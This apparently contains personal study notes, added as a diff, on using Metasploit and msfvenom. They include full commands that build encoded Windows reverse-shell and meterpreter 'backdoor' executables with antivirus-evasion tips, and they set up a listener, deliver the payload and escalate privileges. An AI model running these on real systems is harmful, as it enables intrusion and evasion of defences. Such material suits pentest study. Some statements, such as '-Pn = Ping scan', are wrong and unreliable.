@@ -1,0 +1,150 @@
+Metasploit Framework:
+It is a framework developed by rapid7.It is written in Ruby language.
+They add the modules and exploits after repetitive testing.
+With these exploits we can hack into vulnerable machines and devices.
+
+Metasploit is using postgresql.
+We have to connect to the msf database to access the msf console.
+
+"msfdb reinit" - this command reinitialize the database and starts
+
+[msf](Jobs:0 Agents:0) >> db_status
+[*] Connected to msf. Connection type: postgresql.
+Enter db_status in msfconsole to check if database is connected
+
+Modules:
+Auxiliary:
+These auxiliary modules contains everything other than exploits.
+Scanners, fuzzers, enum scripts etc.
+
+Encoders:
+These encoder modules contains encoders that can encode the exploits, so that antivirus can't detect it.
+
+Exploits:
+This module contain exploits works on multiple platforms.
+
+Nops:
+Nops means No Operation.
+Generally used in exploit development
+
+Payloads:
+This module contains payloads such as bind tcp, reverse tcp etc.
+
+Post:
+This contains post exploitation modules.
+You can use this module only after getting access to the target machine.
+--------------------------------------------------------------------------------------------
+
+
+MSF Venom:
+It is a metasploit standalone payload generator.
+
+msfvenom -l  all
+This will list all modules that can be used with msfvenom
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.29 LPORT=1234 -a x86 -f c
+-p stands for payload
+-a stands for architecture
+-f stands for format 
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.29 LPORT=1234 -a x86 -b "\x00" -f c
+-b is used to remove the bad characters.
+\x00 is the nullbyte
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.29 LPORT=1234 -a x86 -b "\x00" -e x86/shikata_ga_nai -f exe > payload.exe
+Here we are using encoder and getting the payload in exe format and saving it to a new exe file.
+When trying to bypass antivirus, just focus on bypassing the antivirus that your target has.
+If your target uses kaspersky, then focus on bypassing that only, you don't need to bypass every antivirus.
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.29 LPORT=1234 -b "\x00\x0a\0x0d" -e x86/shikata_ga_nai -f c
+Here we are removing x0a\x0d which are \n and \r...
+
+By using encoders we can encode the same payload again and again.
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.251 LPORT=1234 -b "\x00\x0d\x0a" -e x86/shikata_ga_nai -f c -i 5
+Here we are encoding the same payload 5 times.
+-i is the iterations(no.of times the payload has to encoded)
+
+------------------------------------------------------------------------------------------------------
+
+
+MSF CONSOLE:
+
+setg RHOSTS 192.168.0.46
+The above command is used to set global value.
+SO if you are working with the same target,  then you can set it.
+
+db_nmap -v -n -Pn 192.168.29.186
+This will store all the output in the storage and give us in xml format.
+-v = verbose
+-n = no-dns
+-Pn = Ping scan
+
+msf6 > hosts
+This will give host details of last scan
+
+msf6 > services
+This will give service details of last scan
+
+msf6 > search portscan
+This will give us all portscanners in msf
+
+msf6 > search type:auxiliary smb
+This will search for payloads or scanners in the particular module.
+-------------------------------------------------------------------------------------------------------
+
+
+
+Reference:
+https://www.offensive-security.com/metasploit-unleashed/payloads/
+
+There are 3 types of payload modules in metasploit.
+1) Singles
+2) Stagers
+3) Stages
+
+Single payloads:
+This type of payload is a single file, executed at once.
+eg: windows/shell_bind_tcp is a single payload with no stage
+ 
+Stagers:
+Stagers setup a network connection between the attacker and victim and are designed to be small and reliable.
+First, stagers will get executed in the attacker machine, then it will get the stages and will get executed. It is very less in size.
+eg: windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).
+
+Stages:
+Stages are payload components that are downloaded by Stagers modules.
+Payload stages automatically use ‘middle stagers’
+A single recv() fails with large payloads
+The stager receives the middle stager
+The middle stager then performs a full download
+
+
+Meterpreter is a Metasploit attack payload that provides an interactive shell to the attacker from which to explore the target machine and execute code
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip-addr> LPORT=1234 -a x86 -b "\x00\x0a\x0d" -f exe > meterpreter_backdoor.exe
+
+Multihandler:
+multi/handler, which is a stub that handles exploits launched outside of the framework.
+stub is a part of exploit.
+msf6 > use multi/handler
+msf6 > set payload windows/meterpreter/reverse_tcp
+msf6 > set LHOST <ip-addr>
+msf6 > set LPORT <port>
+msf6 > run
+
+First make a meterpreter payload and send it to target machine.
+Then run the multi/handler commands.
+Now execute the meterpreter payload in target machine.
+Now you will get the shell.
+
+
+POST EXPLOITATION:
+meterpreter > getprivs
+meterpreter > getsystem
+meterpreter > getuid
+"Now the privilege escalation is successfull"
+
+meterpreter > screenshot
+"You will get the screenshot of the target system"
+
